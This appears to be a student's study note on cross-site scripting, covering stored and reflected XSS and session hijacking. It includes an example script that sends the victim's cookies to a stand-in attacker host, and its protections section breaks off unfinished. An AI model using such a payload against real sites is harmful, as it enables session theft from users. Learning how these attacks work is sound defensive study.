---
tags:
  - SaN
---
Inject client-side code into web pages viewed by other users.
- Attacker tricks web application to include malicious code (typically JavaScript)
- Goals:
	- Display images, open popups
	- Change page contents
	- Session Hijacking: Steal cookies
- Underlying issue: Input/Output Validation - *Never trust a users input!*

### Stored XSS
Stored XSS occurs when the attacker can inject malicious code into a server-side storage (e.g., database) and that code is later on displayed to other users.


### Reflected XSS
Reflected XSS occurs when injected malicious code is not stored on the server, but is immediately displayed on the visited page.


### Session Hijacking with XSS
**Cookie stealing**
![[Pasted image 20260323142244.png]]

Example script:
```
<script>
	document.location.replace(
		"http://www.badguy.example/steal.php" 
		+ "?what=" + document.cookie)
</script>
```

- Redirects victim's browser to attackers site, passing cookie
- Might also pass currently visited web page
- Alternatively, do a request, load an image, etc


### XSS Protections
- Vallidate user 